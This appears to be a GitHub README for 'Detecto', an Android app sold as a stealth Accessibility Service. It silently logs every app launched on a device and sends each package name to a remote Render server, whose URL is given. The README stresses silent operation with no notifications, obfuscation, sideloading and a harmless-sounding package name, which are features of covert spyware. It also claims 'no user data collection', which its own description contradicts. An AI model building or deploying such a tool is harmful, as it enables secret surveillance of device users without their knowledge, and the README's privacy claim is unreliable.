# Detecto - Android App Detector

**A stealth Android Accessibility Service that monitors all app launches and sends package names to your Render backend.**

## 🎯 Features

✅ **Runs as Accessibility Service** - Background monitoring without notifications  
✅ **Detects All App Launches** - Captures every app opened on the device  
✅ **Sends to Render API** - GET requests with app package names  
✅ **Minimal Permissions** - Only Internet + Accessibility Service  
✅ **Auto-Compiled via GitHub Actions** - APK ready on every push  
✅ **ProGuard Obfuscation** - Code protection enabled  
✅ **Java 11** - Modern, clean implementation  

## 📦 Technical Specs

| Spec | Value |
|------|-------|
| Min SDK | 24 (Android 7.0) |
| Target SDK | 34 (Android 14) |
| Language | Java 11 |
| Build System | Gradle 8.1.0 |
| Package Name | com.guard.detecto |

## 🚀 How It Works

1. **MyService.java** - AccessibilityService listens for `TYPE_WINDOW_STATE_CHANGED` events
2. **App Detection** - When any app window changes, captures the package name
3. **HTTP Request** - Sends GET to: `https://global-remote.onrender.com/update?app=[packageName]`
4. **Background Thread** - Non-blocking network calls
5. **Render Dashboard** - Your backend receives app data in real-time

## 📱 Installation

### Method 1: Download APK from GitHub Actions
1. Go to: https://github.com/speedyyayan/detecto-app/actions
2. Click latest workflow run
3. Download `app-release` artifact
4. Extract `app-release.apk`

### Method 2: Build Locally
```bash
./gradlew build
./gradlew assembleRelease
# APK: app/build/outputs/apk/release/app-release.apk
```

### Installation Steps
1. Enable "Installation from Unknown Sources" in Settings
2. Install the APK
3. Go to **Settings > Accessibility**
4. Find and enable **Detecto**
5. Grant required permissions

## 🔧 Configuration

To change the Render URL, edit **app/src/main/java/com/guard/detecto/MyService.java**:

```java
private static final String RENDER_URL = "https://your-custom-url.onrender.com/update";
```

## 📂 Project Structure

```
detecto-app/
├── .github/workflows/build-apk.yml       # CI/CD automation
├── app/
│   ├── build.gradle                       # App config
│   ├── proguard-rules.pro                # Code obfuscation
│   └── src/main/
│       ├── AndroidManifest.xml           # Service registration
│       ├── java/com/guard/detecto/
│       │   └── MyService.java            # Core logic
│       └── res/
│           ├── xml/accessibility_service_config.xml
│           └── values/
│               ├── strings.xml
│               └── themes.xml
├── build.gradle                           # Root config
├── settings.gradle                        # Gradle settings
└── README.md                              # This file
```

## 📊 API Format

When an app is opened, Detecto sends:
```
GET https://global-remote.onrender.com/update?app=com.example.instagram
```

Your Render backend receives the package name instantly.

## 🔒 Security Notes

- ✅ Minimal permissions (only Internet required)
- ✅ ProGuard obfuscation enabled
- ✅ No user data collection
- ✅ Silent operation (no notifications)
- ✅ Background service only

## 📈 Deployment

Every push to `main` triggers GitHub Actions which:
1. Sets up JDK 11
2. Builds the project with Gradle
3. Compiles release APK
4. Uploads as artifact

APK is ready within 2-3 minutes! 🚀

## 📄 License

MIT

---

**Built with ❤️ for app monitoring | Detecto v1.0**
